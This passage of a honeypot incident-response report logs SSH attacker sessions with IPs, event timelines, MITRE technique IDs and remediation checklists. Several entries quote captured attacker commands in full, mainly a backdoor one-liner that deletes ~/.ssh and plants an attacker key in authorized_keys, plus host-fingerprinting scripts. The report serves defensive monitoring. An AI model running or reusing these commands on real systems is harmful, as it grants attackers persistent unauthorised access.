- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d67de1a9e08e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-07-19 05:07 |
| **Last Seen** | 2026-07-19 05:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:07:05` | `cowrie.session.connect` |
| `2026-07-19 05:07:05` | `cowrie.client.version` |
| `2026-07-19 05:07:05` | `cowrie.client.kex` |
| `2026-07-19 05:07:06` | `cowrie.login.success` |
| `2026-07-19 05:07:07` | `cowrie.session.params` |
| `2026-07-19 05:07:07` | `cowrie.command.input` |
| `2026-07-19 05:07:07` | `cowrie.command.failed` |
| `2026-07-19 05:07:08` | `cowrie.log.closed` |
| `2026-07-19 05:07:09` | `cowrie.session.params` |
| `2026-07-19 05:07:09` | `cowrie.command.input` |
| `2026-07-19 05:07:09` | `cowrie.session.file_download` |
| `2026-07-19 05:07:09` | `cowrie.log.closed` |
| `2026-07-19 05:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-995298e7e37b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:07 |
| **Last Seen** | 2026-07-19 05:07 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:07:07` | `cowrie.session.connect` |
| `2026-07-19 05:07:11` | `cowrie.client.version` |
| `2026-07-19 05:07:11` | `cowrie.client.kex` |
| `2026-07-19 05:07:28` | `cowrie.login.success` |
| `2026-07-19 05:07:38` | `cowrie.session.params` |
| `2026-07-19 05:07:38` | `cowrie.command.input` |
| `2026-07-19 05:07:42` | `cowrie.log.closed` |
| `2026-07-19 05:07:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1773a6363efd

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-07-19 05:07 |
| **Last Seen** | 2026-07-19 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:07:09` | `cowrie.session.connect` |
| `2026-07-19 05:07:09` | `cowrie.client.version` |
| `2026-07-19 05:07:09` | `cowrie.client.kex` |
| `2026-07-19 05:07:10` | `cowrie.login.success` |
| `2026-07-19 05:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9341260a9ee9

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-07-19 05:07 |
| **Last Seen** | 2026-07-19 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:07:11` | `cowrie.session.connect` |
| `2026-07-19 05:07:11` | `cowrie.client.version` |
| `2026-07-19 05:07:11` | `cowrie.client.kex` |
| `2026-07-19 05:07:12` | `cowrie.login.success` |
| `2026-07-19 05:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47dad15a8d94

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:07 |
| **Last Seen** | 2026-07-19 05:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:07:14` | `cowrie.session.connect` |
| `2026-07-19 05:07:15` | `cowrie.client.version` |
| `2026-07-19 05:07:15` | `cowrie.client.kex` |
| `2026-07-19 05:07:16` | `cowrie.login.success` |
| `2026-07-19 05:07:17` | `cowrie.session.params` |
| `2026-07-19 05:07:17` | `cowrie.command.input` |
| `2026-07-19 05:07:17` | `cowrie.command.input` |
| `2026-07-19 05:07:17` | `cowrie.command.input` |
| `2026-07-19 05:07:17` | `cowrie.command.input` |
| `2026-07-19 05:07:17` | `cowrie.command.input` |
| `2026-07-19 05:07:17` | `cowrie.command.success` |
| `2026-07-19 05:07:17` | `cowrie.command.input` |
| `2026-07-19 05:07:17` | `cowrie.command.input` |
| `2026-07-19 05:07:17` | `cowrie.command.input` |
| `2026-07-19 05:07:17` | `cowrie.command.input` |
| `2026-07-19 05:07:18` | `cowrie.log.closed` |
| `2026-07-19 05:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cd3db3242c1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:07 |
| **Last Seen** | 2026-07-19 05:08 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:07:25` | `cowrie.session.connect` |
| `2026-07-19 05:07:29` | `cowrie.client.version` |
| `2026-07-19 05:07:29` | `cowrie.client.kex` |
| `2026-07-19 05:07:46` | `cowrie.login.success` |
| `2026-07-19 05:07:58` | `cowrie.session.params` |
| `2026-07-19 05:07:58` | `cowrie.command.input` |
| `2026-07-19 05:08:02` | `cowrie.log.closed` |
| `2026-07-19 05:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ce421510b50

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:07 |
| **Last Seen** | 2026-07-19 05:08 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:07:43` | `cowrie.session.connect` |
| `2026-07-19 05:07:47` | `cowrie.client.version` |
| `2026-07-19 05:07:47` | `cowrie.client.kex` |
| `2026-07-19 05:08:12` | `cowrie.login.success` |
| `2026-07-19 05:08:15` | `cowrie.session.params` |
| `2026-07-19 05:08:15` | `cowrie.command.input` |
| `2026-07-19 05:08:17` | `cowrie.log.closed` |
| `2026-07-19 05:08:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32b139ad7e71

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:08 |
| **Last Seen** | 2026-07-19 05:09 |
| **Session Duration** | 75s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:08:00` | `cowrie.session.connect` |
| `2026-07-19 05:08:04` | `cowrie.client.version` |
| `2026-07-19 05:08:04` | `cowrie.client.kex` |
| `2026-07-19 05:08:50` | `cowrie.login.success` |
| `2026-07-19 05:09:09` | `cowrie.session.params` |
| `2026-07-19 05:09:09` | `cowrie.command.input` |
| `2026-07-19 05:09:15` | `cowrie.log.closed` |
| `2026-07-19 05:09:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a7265460344

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:08 |
| **Last Seen** | 2026-07-19 05:08 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:08:08` | `cowrie.session.connect` |
| `2026-07-19 05:08:19` | `cowrie.client.version` |
| `2026-07-19 05:08:19` | `cowrie.client.kex` |
| `2026-07-19 05:08:24` | `cowrie.login.success` |
| `2026-07-19 05:08:45` | `cowrie.session.params` |
| `2026-07-19 05:08:45` | `cowrie.command.input` |
| `2026-07-19 05:08:52` | `cowrie.log.closed` |
| `2026-07-19 05:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-284b009746dc

| Field | Detail |
|---|---|
| **Source IP** | `119.13.106[.]88` |
| **First Seen** | 2026-07-19 05:08 |
| **Last Seen** | 2026-07-19 05:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:08:12` | `cowrie.session.connect` |
| `2026-07-19 05:08:12` | `cowrie.client.version` |
| `2026-07-19 05:08:13` | `cowrie.client.kex` |
| `2026-07-19 05:08:14` | `cowrie.login.success` |
| `2026-07-19 05:08:15` | `cowrie.session.params` |
| `2026-07-19 05:08:15` | `cowrie.command.input` |
| `2026-07-19 05:08:15` | `cowrie.command.failed` |
| `2026-07-19 05:08:15` | `cowrie.log.closed` |
| `2026-07-19 05:08:16` | `cowrie.session.params` |
| `2026-07-19 05:08:16` | `cowrie.command.input` |
| `2026-07-19 05:08:17` | `cowrie.session.file_download` |
| `2026-07-19 05:08:17` | `cowrie.log.closed` |
| `2026-07-19 05:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.13.106[.]88` to AbuseIPDB if not already reported
- [ ] Block `119.13.106[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da60cdf17f3b

| Field | Detail |
|---|---|
| **Source IP** | `119.13.106[.]88` |
| **First Seen** | 2026-07-19 05:08 |
| **Last Seen** | 2026-07-19 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:08:17` | `cowrie.session.connect` |
| `2026-07-19 05:08:17` | `cowrie.client.version` |
| `2026-07-19 05:08:17` | `cowrie.client.kex` |
| `2026-07-19 05:08:18` | `cowrie.login.success` |
| `2026-07-19 05:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.13.106[.]88` to AbuseIPDB if not already reported
- [ ] Block `119.13.106[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9038aa327575

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-19 05:08 |
| **Last Seen** | 2026-07-19 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:08:18` | `cowrie.session.connect` |
| `2026-07-19 05:08:18` | `cowrie.client.version` |
| `2026-07-19 05:08:18` | `cowrie.client.kex` |
| `2026-07-19 05:08:19` | `cowrie.login.success` |
| `2026-07-19 05:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9519ba4f492

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-19 05:08 |
| **Last Seen** | 2026-07-19 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:08:18` | `cowrie.session.connect` |
| `2026-07-19 05:08:18` | `cowrie.client.version` |
| `2026-07-19 05:08:18` | `cowrie.client.kex` |
| `2026-07-19 05:08:19` | `cowrie.login.success` |
| `2026-07-19 05:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77c6b0138f21

| Field | Detail |
|---|---|
| **Source IP** | `119.13.106[.]88` |
| **First Seen** | 2026-07-19 05:08 |
| **Last Seen** | 2026-07-19 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:08:19` | `cowrie.session.connect` |
| `2026-07-19 05:08:19` | `cowrie.client.version` |
| `2026-07-19 05:08:19` | `cowrie.client.kex` |
| `2026-07-19 05:08:20` | `cowrie.login.success` |
| `2026-07-19 05:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.13.106[.]88` to AbuseIPDB if not already reported
- [ ] Block `119.13.106[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6234e551107d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:08 |
| **Last Seen** | 2026-07-19 05:09 |
| **Session Duration** | 57s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:08:24` | `cowrie.session.connect` |
| `2026-07-19 05:08:29` | `cowrie.client.version` |
| `2026-07-19 05:08:29` | `cowrie.client.kex` |
| `2026-07-19 05:09:04` | `cowrie.login.success` |
| `2026-07-19 05:09:18` | `cowrie.session.params` |
| `2026-07-19 05:09:18` | `cowrie.command.input` |
| `2026-07-19 05:09:22` | `cowrie.log.closed` |
| `2026-07-19 05:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-115200187056

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-19 05:08 |
| **Last Seen** | 2026-07-19 05:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:08:38` | `cowrie.session.connect` |
| `2026-07-19 05:08:38` | `cowrie.client.version` |
| `2026-07-19 05:08:38` | `cowrie.client.kex` |
| `2026-07-19 05:08:38` | `cowrie.login.success` |
| `2026-07-19 05:08:38` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:08:39` | `cowrie.direct-tcpip.data` |
| `2026-07-19 05:08:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a0376a66e2c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:08 |
| **Last Seen** | 2026-07-19 05:10 |
| **Session Duration** | 82s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:08:40` | `cowrie.session.connect` |
| `2026-07-19 05:08:54` | `cowrie.client.version` |
| `2026-07-19 05:08:54` | `cowrie.client.kex` |
| `2026-07-19 05:09:22` | `cowrie.login.success` |
| `2026-07-19 05:09:39` | `cowrie.session.params` |
| `2026-07-19 05:09:39` | `cowrie.command.input` |
| `2026-07-19 05:10:02` | `cowrie.log.closed` |
| `2026-07-19 05:10:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c0dd59cacda

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:08 |
| **Last Seen** | 2026-07-19 05:09 |
| **Session Duration** | 61s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:08:49` | `cowrie.session.connect` |
| `2026-07-19 05:08:57` | `cowrie.client.version` |
| `2026-07-19 05:08:57` | `cowrie.client.kex` |
| `2026-07-19 05:09:25` | `cowrie.login.success` |
| `2026-07-19 05:09:43` | `cowrie.session.params` |
| `2026-07-19 05:09:43` | `cowrie.command.input` |
| `2026-07-19 05:09:50` | `cowrie.log.closed` |
| `2026-07-19 05:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ea18fea0594

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:09 |
| **Last Seen** | 2026-07-19 05:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:09:05` | `cowrie.session.connect` |
| `2026-07-19 05:09:05` | `cowrie.client.version` |
| `2026-07-19 05:09:05` | `cowrie.client.kex` |
| `2026-07-19 05:09:06` | `cowrie.login.success` |
| `2026-07-19 05:09:08` | `cowrie.session.params` |
| `2026-07-19 05:09:08` | `cowrie.command.input` |
| `2026-07-19 05:09:08` | `cowrie.command.input` |
| `2026-07-19 05:09:08` | `cowrie.command.input` |
| `2026-07-19 05:09:08` | `cowrie.command.input` |
| `2026-07-19 05:09:08` | `cowrie.command.input` |
| `2026-07-19 05:09:08` | `cowrie.command.success` |
| `2026-07-19 05:09:08` | `cowrie.command.input` |
| `2026-07-19 05:09:08` | `cowrie.command.input` |
| `2026-07-19 05:09:08` | `cowrie.command.input` |
| `2026-07-19 05:09:08` | `cowrie.command.input` |
| `2026-07-19 05:09:09` | `cowrie.log.closed` |
| `2026-07-19 05:09:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e9d859d8ac3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:09 |
| **Last Seen** | 2026-07-19 05:10 |
| **Session Duration** | 63s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:09:13` | `cowrie.session.connect` |
| `2026-07-19 05:09:19` | `cowrie.client.version` |
| `2026-07-19 05:09:19` | `cowrie.client.kex` |
| `2026-07-19 05:09:49` | `cowrie.login.success` |
| `2026-07-19 05:10:08` | `cowrie.session.params` |
| `2026-07-19 05:10:08` | `cowrie.command.input` |
| `2026-07-19 05:10:17` | `cowrie.log.closed` |
| `2026-07-19 05:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0036ab34e470

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:09 |
| **Last Seen** | 2026-07-19 05:10 |
| **Session Duration** | 68s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:09:22` | `cowrie.session.connect` |
| `2026-07-19 05:09:27` | `cowrie.client.version` |
| `2026-07-19 05:09:27` | `cowrie.client.kex` |
| `2026-07-19 05:10:01` | `cowrie.login.success` |
| `2026-07-19 05:10:23` | `cowrie.session.params` |
| `2026-07-19 05:10:23` | `cowrie.command.input` |
| `2026-07-19 05:10:30` | `cowrie.log.closed` |
| `2026-07-19 05:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07deafbf14b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:09 |
| **Last Seen** | 2026-07-19 05:10 |
| **Session Duration** | 76s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:09:29` | `cowrie.session.connect` |
| `2026-07-19 05:09:40` | `cowrie.client.version` |
| `2026-07-19 05:09:40` | `cowrie.client.kex` |
| `2026-07-19 05:10:15` | `cowrie.login.success` |
| `2026-07-19 05:10:32` | `cowrie.session.params` |
| `2026-07-19 05:10:32` | `cowrie.command.input` |
| `2026-07-19 05:10:46` | `cowrie.log.closed` |
| `2026-07-19 05:10:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-777c435a1714

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:09 |
| **Last Seen** | 2026-07-19 05:11 |
| **Session Duration** | 81s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
